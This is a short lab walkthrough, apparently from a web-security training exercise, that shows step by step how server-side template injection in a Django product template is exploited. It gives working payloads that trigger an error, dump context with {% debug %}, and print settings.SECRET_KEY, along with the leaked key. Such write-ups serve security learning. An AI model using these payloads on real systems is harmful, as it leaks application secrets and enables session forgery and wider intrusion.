Server-side template injection with information disclosure via user-supplied objects

Once again we start by trying to generate an error to observe the underlying library:

<p>Hurry! Only {{product.stock}} left of {{product.name}} at ${{<%[%'"}}%\.</p>

Hit preview and we get an error:
Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"' 

So we're working with django.

Checking the djnago documentation, we find the debug function, {% debug %}:
https://docs.djangoproject.com/en/dev/ref/templates/builtins/#debug

Let's triggget it to see what we have access to:

<p>Hurry! Only {{product.stock}} left of {{product.name}} at {% debug %}</p>

Hit preview and you'll get a rather lengthy response. We only care about the settings object:
'settings': <LazySettings "None">}

Let's check the doc:
https://docs.djangoproject.com/en/3.0/ref/settings/

We're after the secret key so let's try that:
{{settings.SECRET_KEY}}
<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{settings.SECRET_KEY}}</p>

Nice, we got our key:
<p>Hurry! Only 393 left of Hydrated Crackers at dz4e28nlj25dgiere325p8q3476d3fel</p> 

Submit it and you're done.
